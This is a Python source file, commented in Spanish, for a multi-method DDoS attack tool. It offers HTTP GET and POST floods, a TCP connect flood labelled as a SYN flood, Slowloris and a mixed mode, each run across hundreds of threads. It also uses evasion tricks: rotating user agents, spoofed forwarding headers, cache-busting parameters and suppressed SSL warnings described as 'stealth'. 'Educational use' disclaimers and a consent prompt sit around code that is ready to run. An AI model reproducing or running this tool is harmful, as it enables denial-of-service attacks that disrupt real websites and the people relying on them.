#!/usr/bin/env python3
"""
==============================================
DDOS ATTACK TOOL
==============================================
BY: ALVARO MANZO
VERSION: 2.0 PROFESSIONAL EDITION
USO EXCLUSIVAMENTE EDUCATIVO Y ETICO
NO USAR PARA ACTIVIDADES MALICIOSAS
==============================================
"""

import requests
import threading
import socket
import random
import time
import sys
import os
import json
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
import ssl
import urllib3
from datetime import datetime

# Deshabilitar advertencias SSL para mayor stealth
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class AdvancedDDoSFramework:
    def __init__(self):
        self.target_url = ""
        self.target_ip = ""
        self.target_port = 80
        self.threads = 200
        self.attack_duration = 60
        self.request_timeout = 5
        self.success_count = 0
        self.error_count = 0
        self.total_requests = 0
        self.start_time = None
        self.running = False
        
        # User agents rotativos para evasión
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0"
        ]
        
        # Payloads para diferentes tipos de ataques
        self.post_payloads = [
            {"data": "x" * 1024},
            {"json": {"attack": "test", "payload": "x" * 2048}},
            {"files": {"file": ("test.txt", "x" * 4096, "text/plain")}},
        ]
        
    def print_banner(self):
        banner = """
    ╔══════════════════════════════════════════════╗
    ║               DDOS ATTACK TOOL               ║
    ║            PROFESSIONAL EDITION              ║
    ╠══════════════════════════════════════════════╣
    ║  [!] USO EXCLUSIVAMENTE EDUCATIVO            ║
    ║  [!] TESTING DE SEGURIDAD AUTORIZADO         ║
    ║  [!] NO USAR PARA ACTIVIDADES ILEGALES       ║
    ╚══════════════════════════════════════════════╝
        """
        print("\033[91m" + banner + "\033[0m")
    
    def get_target_info(self):
        print("\n\033[96m[CONFIG]\033[0m Configuración del objetivo:")
        self.target_url = input("🎯 URL objetivo (http://example.com): ").strip()
        
        if not self.target_url.startswith(('http://', 'https://')):
            self.target_url = 'http://' + self.target_url
            
        # Extraer información del objetivo
        parsed = urlparse(self.target_url)
        self.target_ip = socket.gethostbyname(parsed.hostname)
        self.target_port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        
        print(f"🌐 IP resuelto: {self.target_ip}")
        print(f"🔌 Puerto: {self.target_port}")
        
    def get_attack_config(self):
        print("\n\033[96m[CONFIG]\033[0m Configuración del ataque:")
        
        try:
            self.threads = int(input("🧵 Número de threads (default: 200): ") or 200)
            self.attack_duration = int(input("⏱️  Duración en segundos (default: 60): ") or 60)
            self.request_timeout = int(input("⏳ Timeout por request (default: 5): ") or 5)
        except ValueError:
            print("⚠️  Usando valores por defecto")
            
        print(f"\n\033[93m[INFO]\033[0m Configuración establecida:")
        print(f"  • Threads: {self.threads}")
        print(f"  • Duración: {self.attack_duration}s")
        print(f"  • Timeout: {self.request_timeout}s")
    
    def show_attack_menu(self):
        print("\n\033[96m[MÉTODOS]\033[0m Selecciona el tipo de ataque:")
        print("1. 🌊 HTTP Flood (GET)")
        print("2. 💥 POST Flood") 
        print("3. 🔄 Mixed HTTP Attack")
        print("4. ⚡ TCP SYN Flood")
        print("5. 🚀 Slowloris Attack")
        print("6. 💀 Multi-Vector Attack (RECOMENDADO)")
        print("0. ❌ Salir")
        
        choice = input("\n👉 Selecciona una opción: ").strip()
        return choice
    
    def http_flood_worker(self):
        session = requests.Session()
        session.verify = False
        
        while self.running:
            try:
                headers = {
                    'User-Agent': random.choice(self.user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'Cache-Control': f'max-age={random.randint(0, 3600)}',
                    'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                    'X-Real-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                }
                
                # Añadir parámetros aleatorios para evadir cache
                params = {
                    'cache_bust': random.randint(100000, 999999),
                    'ref': random.choice(['google', 'bing', 'yahoo', 'direct']),
                    'v': random.randint(1, 100)
                }
                
                response = session.get(
                    self.target_url, 
                    headers=headers, 
                    params=params,
                    timeout=self.request_timeout,
                    allow_redirects=False
                )
                
                self.success_count += 1
                self.total_requests += 1
                
            except Exception as e:
                self.error_count += 1
                self.total_requests += 1
            
            time.sleep(random.uniform(0.01, 0.1))  # Variación temporal
    
    def post_flood_worker(self):
        session = requests.Session()
        session.verify = False
        
        while self.running:
            try:
                headers = {
                    'User-Agent': random.choice(self.user_agents),
                    'Content-Type': random.choice([
                        'application/x-www-form-urlencoded',
                        'application/json',
                        'multipart/form-data'
                    ]),
                    'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                }
                
                payload = random.choice(self.post_payloads)
                
                if 'json' in payload:
                    response = session.post(
                        self.target_url,
                        json=payload['json'],
                        headers=headers,
                        timeout=self.request_timeout
                    )
                elif 'files' in payload:
                    response = session.post(
                        self.target_url,
                        files=payload['files'],
                        headers=headers,
                        timeout=self.request_timeout
                    )
                else:
                    response = session.post(
                        self.target_url,
                        data=payload['data'],
                        headers=headers,
                        timeout=self.request_timeout
                    )
                
                self.success_count += 1
                self.total_requests += 1
                
            except Exception as e:
                self.error_count += 1
                self.total_requests += 1
            
            time.sleep(random.uniform(0.01, 0.1))
    
    def tcp_syn_flood_worker(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                
                # Puerto aleatorio para el ataque
                source_port = random.randint(1024, 65535)
                sock.bind(('', source_port))
                
                result = sock.connect_ex((self.target_ip, self.target_port))
                sock.close()
                
                if result == 0 or result == 111:  # Conexión exitosa o rechazada
                    self.success_count += 1
                else:
                    self.error_count += 1
                    
                self.total_requests += 1
                
            except Exception as e:
                self.error_count += 1
                self.total_requests += 1
            
            time.sleep(0.001)  # Muy rápido para SYN flood
    
    def slowloris_worker(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((self.target_ip, self.target_port))
                
                # Enviar headers incompletos
                sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                sock.send(f"User-Agent: {random.choice(self.user_agents)}\r\n".encode())
                sock.send(f"Accept-language: en-US,en,q=0.5\r\n".encode())
                
                # Mantener conexión viva enviando headers parciales
                for _ in range(100):
                    if not self.running:
                        break
                    sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                    time.sleep(15)
                
                sock.close()
                self.success_count += 1
                self.total_requests += 1
                
            except Exception as e:
                self.error_count += 1
                self.total_requests += 1
    
    def mixed_attack_worker(self):
        # Alterna entre diferentes tipos de ataques
        attack_methods = [
            self.http_flood_worker,
            self.post_flood_worker,
            self.slowloris_worker
        ]
        
        while self.running:
            method = random.choice(attack_methods)
            # Ejecutar método por un tiempo corto
            original_running = self.running
            threading.Timer(random.uniform(1, 5), lambda: None).start()
            method()
    
    def start_attack(self, attack_type):
        print(f"\n\033[91m[INICIANDO]\033[0m Preparando ataque tipo {attack_type}...")
        
        self.running = True
        self.start_time = time.time()
        self.success_count = 0
        self.error_count = 0
        self.total_requests = 0
        
        # Seleccionar worker según el tipo de ataque
        worker_map = {
            '1': self.http_flood_worker,
            '2': self.post_flood_worker,
            '3': self.mixed_attack_worker,
            '4': self.tcp_syn_flood_worker,
            '5': self.slowloris_worker,
            '6': self.mixed_attack_worker  # Multi-vector usa mixed
        }
        
        worker = worker_map.get(attack_type, self.http_flood_worker)
        
        # Crear y lanzar threads
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            threads.append(t)
        
        print(f"\033[92m[ACTIVO]\033[0m {self.threads} threads lanzados contra {self.target_url}")
        print("\033[93m[INFO]\033[0m Presiona Ctrl+C para detener el ataque\n")
        
        try:
            # Monitoreo en tiempo real
            while time.time() - self.start_time < self.attack_duration:
                time.sleep(1)
                self.show_stats()
                
        except KeyboardInterrupt:
            print("\n\033[93m[DETENIENDO]\033[0m Ataque interrumpido por el usuario")
        
        self.running = False
        print("\n\033[92m[FINALIZADO]\033[0m Ataque completado")
        self.show_final_stats()
    
    def show_stats(self):
        elapsed = time.time() - self.start_time
        rps = self.total_requests / elapsed if elapsed > 0 else 0
        success_rate = (self.success_count / self.total_requests * 100) if self.total_requests > 0 else 0
        
        print(f"\r\033[K📊 Stats: {self.total_requests} req | {rps:.1f} req/s | {success_rate:.1f}% éxito | {elapsed:.0f}s", end="", flush=True)
    
    def show_final_stats(self):
        elapsed = time.time() - self.start_time
        avg_rps = self.total_requests / elapsed if elapsed > 0 else 0
        success_rate = (self.success_count / self.total_requests * 100) if self.total_requests > 0 else 0
        
        print(f"\n\n\033[96m{'='*50}")
        print("           ESTADÍSTICAS FINALES")
        print(f"{'='*50}\033[0m")
        print(f"🎯 Objetivo: {self.target_url}")
        print(f"⏱️  Duración: {elapsed:.2f} segundos")
        print(f"📤 Total requests: {self.total_requests}")
        print(f"✅ Exitosos: {self.success_count}")
        print(f"❌ Errores: {self.error_count}")
        print(f"📈 Tasa de éxito: {success_rate:.2f}%")
        print(f"⚡ Promedio req/s: {avg_rps:.2f}")
        print(f"🧵 Threads utilizados: {self.threads}")
        
        # Guardar log
        self.save_attack_log(elapsed, avg_rps, success_rate)
    
    def save_attack_log(self, duration, avg_rps, success_rate):
        log_data = {
            "timestamp": datetime.now().isoformat(),
            "target_url": self.target_url,
            "target_ip": self.target_ip,
            "duration": duration,
            "total_requests": self.total_requests,
            "success_count": self.success_count,
            "error_count": self.error_count,
            "success_rate": success_rate,
            "avg_requests_per_second": avg_rps,
            "threads": self.threads
        }
        
        try:
            with open("ddos_attack_log.json", "a") as f:
                f.write(json.dumps(log_data) + "\n")
            print(f"📋 Log guardado en: ddos_attack_log.json")
        except:
            pass
    
    def run(self):
        try:
            self.print_banner()
            self.get_target_info()
            self.get_attack_config()
            
            while True:
                choice = self.show_attack_menu()
                
                if choice == '0':
                    print("\n👋 Saliendo...")
                    break
                elif choice in ['1', '2', '3', '4', '5', '6']:
                    confirm = input(f"\n⚠️  ¿Confirmas el ataque contra {self.target_url}? (y/N): ")
                    if confirm.lower() == 'y':
                        self.start_attack(choice)
                    else:
                        print("❌ Ataque cancelado")
                else:
                    print("❌ Opción inválida")
                    
        except KeyboardInterrupt:
            print("\n\n👋 Programa interrumpido")
        except Exception as e:
            print(f"\n❌ Error crítico: {e}")

def main():
    print("\033[91m" + "="*60 + "\033[0m")
    print("\033[91m⚠️  ADVERTENCIA LEGAL ⚠️\033[0m")
    print("\033[91m" + "="*60 + "\033[0m")
    print("Este software es para PRUEBAS DE SEGURIDAD AUTORIZADAS únicamente.")
    print("El uso no autorizado es ILEGAL y puede resultar en consecuencias legales.")
    print("El autor NO se hace responsable del mal uso de esta herramienta.")
    print("\033[91m" + "="*60 + "\033[0m")
    
    consent = input("\n¿Confirmas que tienes autorización para usar esta herramienta? (y/N): ")
    if consent.lower() != 'y':
        print("❌ Consentimiento denegado. Saliendo...")
        sys.exit(1)
    
    # Verificar que no es un objetivo protegido
    ddos_framework = AdvancedDDoSFramework()
    ddos_framework.run()

if __name__ == "__main__":
    main()